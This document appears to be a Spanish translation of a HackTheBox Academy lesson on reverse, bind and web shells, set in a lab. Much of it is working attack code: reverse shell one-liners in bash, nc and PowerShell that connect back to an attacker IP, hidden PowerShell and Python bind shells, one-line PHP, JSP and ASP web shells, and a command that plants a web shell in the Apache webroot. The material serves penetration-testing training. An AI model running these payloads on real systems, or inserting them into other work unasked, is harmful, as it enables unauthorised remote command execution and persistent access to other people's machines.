## **TIPOS DE SHELLS**

Una vez que comprometemos un sistema y explotamos una vulnerabilidad para ejecutar comandos en los hosts comprometidos de forma remota, generalmente necesitamos un método de comunicación con el sistema para no tener que seguir explotando la misma vulnerabilidad para ejecutar cada comando. Para enumerar el sistema o tomar más control sobre él o dentro de su red, necesitamos una conexión confiable que nos brinde acceso directo al shell del sistema, es decir, Bash o PowerShell, para que podamos investigar a fondo el sistema remoto para nuestro próximo movimiento. 

Una forma de conectarse a un sistema comprometido es a través de protocolos de red, como `SSH` para Linux o `WinRM` para Windows, lo que nos permitiría iniciar sesión de forma remota en el sistema comprometido. Sin embargo, a menos que obtengamos un conjunto funcional de credenciales de inicio de sesión, no podremos utilizar estos métodos sin ejecutar primero los comandos en el sistema remoto, para obtener acceso a estos servicios en primer lugar. 

El otro método para acceder a un host comprometido para el control y la ejecución remota de código es a través de shells.
Como se discutió anteriormente, hay tres tipos principales de shells: Reverse Shell, Bind Shell y Web Shell. Cada uno de estos proyectiles tiene un método diferente de comunicación con nosotros para aceptar y ejecutar nuestros comandos. 

| Tipo de Shell | Metodo de comunicacion |
| -- | -- |
| Reverse Shell |Se conecta de nuevo a nuestro sistema y nos da el control a través de una conexión inversa. |
| Bind Shell | Espera a que nos conectemos a ella y nos da control una vez que lo hacemos |
| Web Shell | Se comunica a través de un servidor web, acepta nuestros comandos a través de parámetros HTTP, los ejecuta e imprime la salida. | 

Profundicemos más en cada uno de las shells anteriores y analicemos ejemplos de cada uno. 
___

### REVERSE SHELL

Es el tipo de shell más común, ya que es el método más rápido y sencillo para obtener control sobre un host comprometido. Una vez que identificamos una vulnerabilidad en el host remoto que permite la ejecución remota de código, podemos iniciar un listener de `netcat` en nuestra máquina que escucha en un puerto específico, digamos el puerto `1234`. Con este listener en su lugar, podemos ejecutar un comando reverse shell que conecta el shell del sistema remoto, es decir, Bash o PowerShell a nuestro listener netcat, lo que nos proporciona una conexión inversa sobre el sistema remoto. 

#### NETCAT LISTENER

El primer paso es iniciar un netcat listener en un puerto de nuestra elección: 

~~~
$ nc -lvnp 1234

listening on [any] 1234 ...
~~~

Las flags que estamos usando son las siguientes: 

| Flag | Descripcion
| -- | -- |
| -l | Modo escucha, para esperar una conexión para conectarnos. |
| -v | Modo verbose, para que sepamos cuando recibimos una conexión. | 
| -n | Deshabilita la resolución de DNS y solo conécta desde/hacia IP para acelerar la conexión. |
| -p 1234 | El número de puerto netcat está escuchando y se debe enviar la conexión inversa. |

Ahora que tenemos un listener de netcat esperando una conexión, podemos ejecutar el comando de shell inverso que se conecta a nosotros. 

#### *CONECTAR IP POSTERIOR*

Sin embargo, primero, necesitamos encontrar la IP de nuestro sistema para enviarnos una conexión inversa. Podemos encontrar nuestra IP con el siguiente comando: 

~~~

$ ip a

...SNIP...

3: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 500
    link/none
    inet 10.10.10.10/23 scope global tun0
...SNIP...

~~~

En nuestro ejemplo, la IP que nos interesa está bajo tun0, que es la misma red HTB a la que nos conectamos a través de nuestra VPN. 

>Nota: Nos estamos conectando a la IP en 'tun0' porque solo podemos conectarnos a las box HackTheBox a través de la conexión VPN, ya que no tienen conexión a Internet y, por lo tanto, no pueden conectarse a nosotros a través de Internet usando 'eth0'. En un pentest real, puede estar conectado directamente a la misma red, o realizando una prueba de penetración externa, por lo que puede conectarse a través del adaptador `eth0` o similar.

#### *COMANDO REVERSE SHELL*

El comando que ejecutamos depende del sistema operativo en el que se ejecuta el host comprometido, es decir, Linux o Windows, y a qué aplicaciones y comandos podemos acceder. La página [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) tiene una lista completa de comandos de shell inverso que podemos usar que cubren una amplia gama de opciones dependiendo de nuestro host comprometido. 

Ciertos comandos de shell inverso son más confiables que otros y, por lo general, se pueden intentar para obtener una conexión inversa. Los siguientes comandos son comandos confiables que podemos usar para obtener una conexión inversa, para bash en hosts comprometidos de Linux y Powershell en hosts comprometidos de Windows: 
Code: `bash`
~~~
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
~~~

Code: `bash`
~~~
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
~~~

Code: `powershell`
~~~
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.10.10.10",1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
~~~

Podemos utilizar el exploit que tenemos sobre el host remoto para ejecutar uno de los comandos anteriores, es decir, a través de un exploit de Python o un módulo de Metasploit, para obtener una conexión inversa. Una vez que lo hagamos, deberíamos recibir una conexión en nuestro listener netcat: 

comando reverse shell
~~~
$ nc -lvnp 1234

listening on [any] 1234 ...
connect to [10.10.10.10] from (UNKNOWN) [10.10.10.1] 41572

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
~~~

Como podemos ver, después de recibir una conexión en nuestro listener de netcat, pudimos escribir nuestro comando y recuperar directamente su output, directamente en nuestra máquina. 

Un Reverse Shell es útil cuando queremos obtener una conexión rápida y confiable a nuestro host comprometido. Sin embargo, un Reverse Shell puede ser muy frágil. Una vez que se detiene el comando de reverse shell, o si perdemos nuestra conexión por cualquier motivo, tendríamos que usar el exploit inicial para ejecutar el comando de reverse shell nuevamente para recuperar nuestro acceso. 

___

### BIND SHELL

Otro tipo de shell es un Bind Shell. A diferencia de un Reverse Shell que se conecta a nosotros, tendremos que conectarnos a él en el puerto de escucha de los objetivos. 

Una vez que ejecutamos un comando Bind Shell, comenzará a escuchar en un puerto en el host remoto y vinculará el shell de ese host, es decir, Bash o PowerShell, a ese puerto. Tenemos que conectarnos a ese puerto con netcat, y obtendremos el control a través de un shell en ese sistema. 
___

### COMANDO BIND SHELL

Una vez más, podemos utilizar [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet.md) para encontrar un comando adecuado para iniciar nuestro bind shell

>Nota: iniciaremos una conexión de escucha en el puerto '1234' en el host remoto, con IP '0.0.0.0' para que podamos conectarnos desde cualquier lugar. 

Los siguientes son comandos confiables que podemos usar para iniciar una bind shell:

Code: `bash`
~~~
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
~~~

Code: `python`
~~~
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
~~~

Code: `powershell`
~~~
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
~~~
___

### CONEXION NETCAT

Una vez que ejecutamos el comando bind shell, deberíamos tener un shell esperándonos en el puerto especificado. Ahora podemos conectarnos a él.

Podemos usar netcat para conectarnos a ese puerto y obtener una conexión con el shell: 

Conexion netcat
~~~
 nc 10.10.10.1 1234

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
~~~

Como podemos ver, se nos coloca directamente en una sesión de bash y podemos interactuar directamente con el sistema de destino. A diferencia de Reverse Shell, si interrumpimos nuestra conexión a un bind shell por cualquier motivo, podemos volver a conectarnos y obtener otra conexión de inmediato. Sin embargo, si el comando bind shell se detiene por algún motivo, o si se reinicia el host remoto, perderíamos nuestro acceso al host remoto y tendremos que explotarlo nuevamente para obtener acceso. 
___

### UPGRADING TTY

Una vez que nos conectemos a un shell a través de Netcat, notaremos que solo podemos escribir comandos o retroceder, pero no podemos mover el cursor de texto hacia la izquierda o hacia la derecha para editar nuestros comandos, ni podemos subir y bajar para acceder al historial de comandos. Para poder hacer eso, necesitaremos actualizar nuestro TTY. Esto se puede lograr mapeando nuestro TTY terminal con el TTY remoto. 

Hay múltiples métodos para hacer esto. Para nuestros propósitos, usaremos el método `python/stty`. En nuestro shell netcat, usaremos el siguiente comando para usar python para actualizar el tipo de nuestro shell a un TTY completo: 

~~~
$ python -c 'import pty; pty.spawn("/bin/bash")'
~~~

Después de ejecutar este comando, presionaremos `ctrl+z` para poner en segundo plano nuestro shell y volver a nuestro terminal local, e ingresar el siguiente comando stty: 

~~~
@remotehost$ ^Z

Juceco@htb[/htb]$ stty raw -echo
Juceco@htb[/htb]$ fg

[Enter]
[Enter]
www-data@remotehost$
~~~

Una vez que presionamos fg, traerá de vuelta nuestro shell netcat al primer plano. En este punto, el terminal mostrará una línea en blanco. Podemos presionar enter nuevamente para volver a nuestro shell o reinicio de entrada y presionar enter para recuperarlo. En este punto, tendríamos un shell TTY completamente funcional con historial de comandos y todo lo demás. 

Podemos notar que nuestra shell no cubre todo el terminal. Para arreglar esto, necesitamos configurar algunas variables. Podemos abrir otra ventana de terminal en nuestro sistema, maximizar las ventanas o usar cualquier tamaño que queramos, y luego ingresar los siguientes comandos para obtener nuestras variables: 

~~~
$ echo $TERM

xterm-256color
~~~

~~~
$ stty size

67 318
~~~

El primer comando nos mostró la variable `TERM`, y el segundo nos muestra los valores para `filas` y `columnas`, respectivamente. Ahora que tenemos nuestras variables, podemos volver a nuestro shell netcat y usar el siguiente comando para corregirlas: 

~~~
@remotehost$ export TERM=xterm-256color

@remotehost$ stty rows 67 columns 318
~~~

Una vez que hagamos eso, deberíamos tener un shell netcat que use todas las funciones del terminal, como una conexión SSH. 
___

### WEB SHELL

El último tipo de shell que tenemos es Web Shell. Un Web Shell suele ser un script web, es decir, `PHP` o `ASPX`, que acepta nuestro comando a través de parámetros de solicitud HTTP, como los parámetros de solicitud `GET` o `POST, ejecuta nuestro comando e imprime su salida en la página web. 


#### *ESCRIBIENDO UN WEB SHELL*

En primer lugar, debemos escribir nuestro web shell que tomaría nuestro comando a través de una solicitud GET, lo ejecutaría e imprimiría su salida. Un script de web shell suele ser de una sola línea, muy corto y se puede memorizar fácilmente. Los siguientes son algunos scripts de web shell cortos comunes para lenguajes web comunes: 

Code:`php`
~~~
<?php system($_REQUEST["cmd"]); ?>
~~~

Code:`jsp`
~~~
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
~~~

Code:`asp`
~~~
<% eval request("cmd") %>
~~~
___

### CARGANDO UN WEB SHELL

Una vez que tengamos nuestro web shell, debemos colocar nuestro script de web shell en el directorio web del host remoto (webroot) para ejecutar el script a través del navegador web. Esto puede deberse a una vulnerabilidad en una función de carga, que nos permitiría escribir uno de nuestros shells en un archivo, es decir, shell.php y cargarlo, y luego acceder a nuestro archivo cargado para ejecutar comandos.

Sin embargo, si solo tenemos la ejecución de comandos remotos a través de un exploit, podemos escribir nuestro shell directamente en webroot para acceder a él a través de la web. Entonces, el primer paso es identificar dónde está el webroot. Los siguientes son los webroots predeterminados para servidores web comunes: 

| Web Server | Default Webroot |
| -- | -- |
| Apache | /var/www/html/ |
| Nginx | /usr/local/nginx/html/ |
| IIS | c:\inetpub\wwwroot\ |
| XAMPP | C:\xampp\htdocs\ |

Podemos verificar estos directorios para ver qué webroot está en uso y luego usar echo para escribir nuestro eb shell . Por ejemplo, si estamos atacando un host Linux que ejecuta Apache, podemos escribir un shell de `PHP` con el siguiente comando: 

Code:`bash`
~~~
echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
~~~
___
### ACCEDIENDO AL WEB SHELL

Una vez que escribimos nuestro web shell, podemos acceder a él a través de un navegador o usando `cURL`. Podemos visitar la página `shell.php` en el sitio web comprometido y usar `?cmd=id` para ejecutar el comando `id`: 

![http://SERVER_IP:PORT/shell.php?cmd=id](https://academy.hackthebox.com/storage/modules/33/write_shell_exec_1.png)

Otra opcion es usando `cURL`
~~~
user@hostname$ curl http://SERVER_IP:PORT/shell.php?cmd=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
~~~

Como podemos ver, podemos seguir cambiando el comando para obtener su salida. Un gran beneficio de una web shell es que evitaría cualquier restricción de firewall existente, ya que no abrirá una nueva conexión en un puerto sino que se ejecutará en el puerto web 80 o 443, o en cualquier puerto que esté usando la aplicación web. Otro gran beneficio es que si se reinicia el host comprometido, el shell web aún estaría en su lugar, y podemos acceder a él y obtener la ejecución del comando sin explotar el host remoto nuevamente.

Por otro lado, un shell web no es tan interactivo como los reverse shells y bind shell, ya que tenemos que seguir solicitando una URL diferente para ejecutar nuestros comandos. Aún así, en casos extremos, es posible codificar un script de Python para automatizar este proceso y brindarnos un shell web semi-interactivo directamente dentro de nuestra terminal.